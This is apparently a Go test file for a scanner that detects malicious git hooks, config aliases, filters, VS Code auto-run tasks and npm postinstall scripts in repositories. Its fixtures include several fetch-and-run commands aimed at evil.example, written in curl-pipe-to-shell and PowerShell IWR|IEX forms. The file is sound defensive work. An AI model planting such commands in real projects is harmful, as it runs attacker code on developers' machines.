package scan

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func makeRepo(t *testing.T, config string) string {
	t.Helper()
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".git", "HEAD"), "ref: refs/heads/main\n")
	writeFile(t, filepath.Join(root, ".git", "config"), config)
	return root
}

func scan(t *testing.T, root string) []Finding {
	t.Helper()
	_, findings, err := scanRepo(root)
	if err != nil {
		t.Fatalf("scanRepo: %v", err)
	}
	return findings
}

func hasTitle(findings []Finding, title string) bool {
	for _, f := range findings {
		if f.Title == title {
			return true
		}
	}
	return false
}

// hasTitlePrefix matches a finding title that starts with the prefix, because
// the tasks.json command findings list the tokens they matched.
func hasTitlePrefix(findings []Finding, prefix string) bool {
	for _, f := range findings {
		if strings.HasPrefix(f.Title, prefix) {
			return true
		}
	}
	return false
}

func TestParseGitConfig(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config")
	writeFile(t, path, `[core]
	hooksPath = .githooks ; comment
[filter "lfs"]
	clean = git-lfs clean -- %f
[include]
	path = ../extra
`)
	entries, err := parseGitConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 3 {
		t.Fatalf("got %d entries, want 3: %+v", len(entries), entries)
	}
	if entries[0].Section != "core" || entries[0].Value != ".githooks" {
		t.Errorf("entry 0 = %+v", entries[0])
	}
	if entries[1].Section != "filter" || entries[1].Subsection != "lfs" || entries[1].Key != "clean" {
		t.Errorf("entry 1 = %+v", entries[1])
	}
}

func TestScanDetectsHookAndConfig(t *testing.T) {
	root := makeRepo(t, `[core]
	hooksPath = .githooks
[alias]
	deploy = !curl evil.example | sh
[filter "x"]
	smudge = sh -c .payload
`)
	writeFile(t, filepath.Join(root, ".githooks", "post-checkout"), "#!/bin/sh\nsh .payload\n")
	writeFile(t, filepath.Join(root, ".githooks", "pre-commit.sample"), "sample")

	findings := scan(t, root)
	if !hasTitle(findings, "core.hooksPath") {
		t.Error("missing core.hooksPath finding")
	}
	if !hasTitle(findings, "alias.deploy") {
		t.Error("missing alias finding")
	}
	if !hasTitle(findings, "filter.x.smudge") {
		t.Error("missing filter finding")
	}
	if !hasTitle(findings, "Active git hook: post-checkout") {
		t.Error("missing hook finding")
	}
	if hasTitle(findings, "Active git hook: pre-commit.sample") {
		t.Error("sample hook must be ignored")
	}
}

func TestIncludeFileIsScanned(t *testing.T) {
	root := makeRepo(t, `[include]
	path = extra.cfg
`)
	writeFile(t, filepath.Join(root, ".git", "extra.cfg"), "[core]\n\tsshCommand = sh -c bad\n")

	if findings := scan(t, root); !hasTitle(findings, "core.sshCommand") {
		t.Errorf("included config not scanned: %+v", findings)
	}
}

// TestIncludeOutsideTheTreeIsNotFollowed checks the scanner does not read files
// the user never pointed it at. A repository can ship its own .git/config, so
// `include.path` is attacker-controlled; an absolute path or a `../` chain used
// to send the scanner off the tree. The directive is still reported, so nothing
// is hidden from the reader.
func TestIncludeOutsideTheTreeIsNotFollowed(t *testing.T) {
	for name, inc := range map[string]string{
		"absolute":      "/etc/passwd",
		"home":          "~/.gitconfig",
		"parent":        "../../../../../../etc/gitconfig",
		"parent once":   "../outside.cfg",
		"dot dot mid":   "sub/../../outside.cfg",
		"leading slash": "/tmp/evil.cfg",
	} {
		t.Run(name, func(t *testing.T) {
			// The escape target is a real file outside the tree, holding a key
			// that would be CRITICAL if it were read.
			outside := filepath.Join(t.TempDir(), "outside.cfg")
			writeFile(t, outside, "[core]\n\tsshCommand = sh -c bad\n")
			inc = strings.ReplaceAll(inc, "/etc/gitconfig", outside)

			root := makeRepo(t, "[include]\n\tpath = "+inc+"\n")
			findings := scan(t, root)

			if hasTitle(findings, "core.sshCommand") {
				t.Errorf("include %q escaped the tree: %+v", inc, findings)
			}
			if !hasTitle(findings, "include.path") {
				t.Errorf("the rejected include must still be reported: %+v", titles(findings))
			}
		})
	}
}

// TestIncludeInsideTheTreeStillResolves checks the bound did not break the
// ordinary cases: a sibling, a subdirectory, and a chain.
func TestIncludeInsideTheTreeStillResolves(t *testing.T) {
	root := makeRepo(t, "[include]\n\tpath = conf/extra.cfg\n")
	writeFile(t, filepath.Join(root, ".git", "conf", "extra.cfg"), "[alias]\n\tco = !echo hi\n")

	if findings := scan(t, root); !hasTitle(findings, "alias.co") {
		t.Errorf("included config not scanned: %+v", titles(findings))
	}
}

// TestHooksPathOutsideTheTreeIsIgnored checks core.hooksPath cannot point the
// hook scan at an arbitrary directory. scanHooks lists whatever it is given, so
// an unconfined path turns a scan into a filesystem probe.
func TestHooksPathOutsideTheTreeIsIgnored(t *testing.T) {
	outside := t.TempDir()
	writeFile(t, filepath.Join(outside, "pre-commit"), "#!/bin/sh\nsh .payload\n")

	for name, hooksPath := range map[string]string{
		"absolute": outside,
		"parent":   filepath.Join("..", filepath.Base(outside)),
		"home":     "~/.local/share/side-eye",
	} {
		t.Run(name, func(t *testing.T) {
			root := makeRepo(t, "[core]\n\thooksPath = "+hooksPath+"\n")
			findings := scan(t, root)

			if hasTitlePrefix(findings, "Active git hook") {
				t.Errorf("hooksPath %q scanned a directory outside the tree: %+v", hooksPath, titles(findings))
			}
			// The configured value is still reported, so the reader sees it.
			if !hasTitle(findings, "core.hooksPath") {
				t.Errorf("the out-of-tree hooksPath must still be reported: %+v", titles(findings))
			}
		})
	}
}

// TestHooksPathInsideTheTreeStillResolves checks a normal relative
// core.hooksPath keeps working.
func TestHooksPathInsideTheTreeStillResolves(t *testing.T) {
	root := makeRepo(t, "[core]\n\thooksPath = .githooks\n")
	writeFile(t, filepath.Join(root, ".githooks", "post-checkout"), "#!/bin/sh\nsh .payload\n")

	if findings := scan(t, root); !hasTitlePrefix(findings, "Active git hook") {
		t.Errorf("relative hooksPath not scanned: %+v", titles(findings))
	}
}

func TestContainedPath(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, ".git")
	writeFile(t, dir, "[core]\n")

	for name, c := range map[string]struct {
		value string
		ok    bool
	}{
		"sibling":     {"extra.cfg", true},
		"subdir":      {filepath.Join("conf", "extra.cfg"), true},
		"dot slash":   {"./extra.cfg", true},
		"dot dot in":  {"conf/../extra.cfg", true},
		"dot dot out": {"../extra.cfg", true}, // back into the tree root from .git
		"absolute":    {"/etc/passwd", false},
		"home":        {"~/.gitconfig", false},
		"parent":      {"../../outside.cfg", false},
		"deep parent": {"../../../../etc/passwd", false},
		"empty":       {"  ", false},
	} {
		t.Run(name, func(t *testing.T) {
			got, ok := containedPath(root, dir, c.value)
			if ok != c.ok {
				t.Fatalf("containedPath(%q) ok = %v, want %v", c.value, ok, c.ok)
			}
			if ok && !underRoot(root, got) {
				t.Errorf("containedPath(%q) = %q, which is outside %q", c.value, got, root)
			}
		})
	}
}

// TestUnderRootRejectsSiblingWithSharedPrefix checks the containment test does
// not do a plain prefix match: /repo-evil is not inside /repo.
func TestUnderRootRejectsSiblingWithSharedPrefix(t *testing.T) {
	root := filepath.Join(t.TempDir(), "repo")
	writeFile(t, root, "[core]\n")
	sibling := root + "-evil"
	writeFile(t, sibling, "[core]\n")

	if underRoot(root, sibling) {
		t.Errorf("underRoot(%q, %q) = true, want false", root, sibling)
	}
	if !underRoot(root, root) {
		t.Errorf("underRoot must accept the root itself")
	}
	if !underRoot(root, filepath.Join(root, ".git", "config")) {
		t.Errorf("underRoot must accept a path inside the root")
	}
}

func TestGitattributesFilter(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".gitattributes"), "*.txt filter=evil\n")

	if findings := scan(t, root); !hasTitle(findings, "Attribute binds filter=evil") {
		t.Errorf("filter attribute not found: %+v", findings)
	}
}

func TestVSCodeTaskFetchesRemoteCode(t *testing.T) {
	cases := []struct {
		name string
		task string
	}{
		{"windows pipe", `{"tasks":[{"command":"curl -s -L https://evil.example/settings/windows | cmd"}]}`},
		{"shell pipe", `{"tasks":[{"command":"bash -c 'curl http://evil.example/mal.sh | bash'","runOptions":{"runOn":"folderOpen"}}]}`},
		{"powershell", `{"tasks":[{"command":"powershell","args":["-c","IWR http://evil.example/a.ps1 | IEX"]}]}`},
	}
	for _, c := range cases {
		root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
		writeFile(t, filepath.Join(root, ".vscode", "tasks.json"), c.task)

		findings := scan(t, root)
		if !hasTitlePrefix(findings, "VS Code task fetches remote code") {
			t.Errorf("%s: fetch finding missing: %+v", c.name, findings)
		}
	}
}

func TestVSCodeShellTaskIsHighNotCritical(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"command":"cmd.exe /c build.bat"}]}`)

	findings := scan(t, root)
	if !hasTitlePrefix(findings, "VS Code task runs a shell") {
		t.Errorf("shell finding missing: %+v", findings)
	}
	if hasTitlePrefix(findings, "VS Code task fetches remote code") {
		t.Errorf("shell-only task must not be critical: %+v", findings)
	}
}

func TestCleanVSCodeTaskHasNoFindings(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"label":"build","type":"npm","script":"build"}]}`)

	for _, f := range scan(t, root) {
		if strings.Contains(f.Path, "tasks.json") {
			t.Errorf("clean task flagged: %+v", f)
		}
	}
}

func TestPackageInstallScript(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, "package.json"), `{"name":"x","scripts":{"postinstall":"curl evil.example|sh"}}`)

	if findings := scan(t, root); !hasTitle(findings, "npm install script: postinstall") {
		t.Errorf("postinstall not found: %+v", findings)
	}
}

func TestCleanRepoHasNoFindings(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".git", "hooks", "pre-commit.sample"), "sample")

	if findings := scan(t, root); len(findings) != 0 {
		t.Errorf("want no findings, got %+v", findings)
	}
}

func TestPlainDirIsScanned(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".vscode", "tasks.json"),
		`{"tasks":[{"runOn":"folderOpen"}]}`)
	writeFile(t, filepath.Join(root, "package.json"), `{"scripts":{"postinstall":"x"}}`)
	writeFile(t, filepath.Join(root, ".githooks", "pre-commit"), "#!/bin/sh\n")

	repo, err := discoverRepo(root)
	if err != nil {
		t.Fatalf("discoverRepo on a plain directory: %v", err)
	}
	if !repo.plain || repo.gitDir != "" {
		t.Errorf("repo = %+v, want plain with no gitDir", repo)
	}

	findings := scan(t, root)
	if !hasTitle(findings, "VS Code auto-run task") {
		t.Errorf("tasks.json finding missing: %+v", findings)
	}
	if !hasTitle(findings, "Active git hook: pre-commit") {
		t.Errorf("tracked hook finding missing: %+v", findings)
	}
}

func TestPlainDirStillReadsGitattributes(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".gitattributes"), "* filter=evil\n")

	if findings := scan(t, root); !hasTitle(findings, "Attribute binds filter=evil") {
		t.Errorf("gitattributes finding missing on a plain directory: %+v", findings)
	}
}

func TestDiscoverWorktreeGitFile(t *testing.T) {
	root := t.TempDir()
	gitDir := t.TempDir()
	writeFile(t, filepath.Join(gitDir, "HEAD"), "ref: refs/heads/main\n")
	writeFile(t, filepath.Join(gitDir, "config"), "[core]\n")
	writeFile(t, filepath.Join(root, ".git"), "gitdir: "+gitDir+"\n")

	repo, err := discoverRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	if repo.gitDir != filepath.Clean(gitDir) {
		t.Errorf("gitDir = %s, want %s", repo.gitDir, gitDir)
	}
}

func TestParseSeverity(t *testing.T) {
	for _, want := range []string{"low", "medium", "high", "critical"} {
		if _, ok := parseSeverity(want); !ok {
			t.Errorf("parseSeverity(%q) failed", want)
		}
	}
	if _, ok := parseSeverity("bogus"); ok {
		t.Error("parseSeverity accepted bogus value")
	}
	// `none` is a -fail-on threshold, not a severity, so a severity name from a
	// finding can never be "none".
	if _, ok := parseSeverity("none"); ok {
		t.Error("parseSeverity accepted none as a severity")
	}
}

func TestParseFailOn(t *testing.T) {
	for _, want := range []string{"low", "medium", "high", "critical", "none"} {
		if _, ok := parseFailOn(want); !ok {
			t.Errorf("parseFailOn(%q) failed", want)
		}
	}
	if _, ok := parseFailOn("bogus"); ok {
		t.Error("parseFailOn accepted bogus value")
	}
	got, _ := parseFailOn("none")
	if got <= SeverityCritical {
		t.Errorf("parseFailOn(none) = %d, want above critical so nothing fails", got)
	}
}

// TestSeverityMarshalsAsName checks the JSON contract. The docs promise the
// name; the code used to emit the bare integer, which ties every consumer to the
// order of the constants.
func TestSeverityMarshalsAsName(t *testing.T) {
	for _, want := range []string{
		"INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL",
	} {
		data, err := json.Marshal(Finding{Severity: parseSeverityMust(want), Title: "x"})
		if err != nil {
			t.Fatalf("marshal: %v", err)
		}
		if !strings.Contains(string(data), `"severity":"`+want+`"`) {
			t.Errorf("severity %s marshalled as %s", want, data)
		}
	}
}

func TestSeverityUnmarshalsFromName(t *testing.T) {
	var f Finding
	if err := json.Unmarshal([]byte(`{"severity":"critical","title":"x"}`), &f); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if f.Severity != SeverityCritical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if err := json.Unmarshal([]byte(`{"severity":"bogus"}`), &f); err == nil {
		t.Error("unmarshal accepted an unknown severity")
	}
	if err := json.Unmarshal([]byte(`{"severity":3}`), &f); err == nil {
		t.Error("unmarshal accepted a numeric severity")
	}
}

func parseSeverityMust(name string) Severity {
	s, ok := parseSeverity(name)
	if !ok {
		panic(name)
	}
	return s
}

func TestHookDetailByMode(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "target")
	writeFile(t, target, "#!/bin/sh\n")

	link := filepath.Join(dir, "pre-commit")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	plain := filepath.Join(dir, "post-merge")
	writeFile(t, plain, "#!/bin/sh\n")
	exec := filepath.Join(dir, "post-checkout")
	writeFile(t, exec, "#!/bin/sh\n")
	if err := os.Chmod(exec, 0o755); err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		path string
		want string
	}{
		{link, "Active hook via symlink to " + target + "; trigger"},
		{plain, "Hook is not executable now, but runs on Windows and after chmod; trigger"},
		{exec, "Active hook; trigger"},
	}
	for _, c := range cases {
		info, err := os.Lstat(c.path)
		if err != nil {
			t.Fatal(err)
		}
		if got := hookDetail(c.path, info, "trigger"); got != c.want {
			t.Errorf("hookDetail(%s) = %q, want %q", filepath.Base(c.path), got, c.want)
		}
	}
}
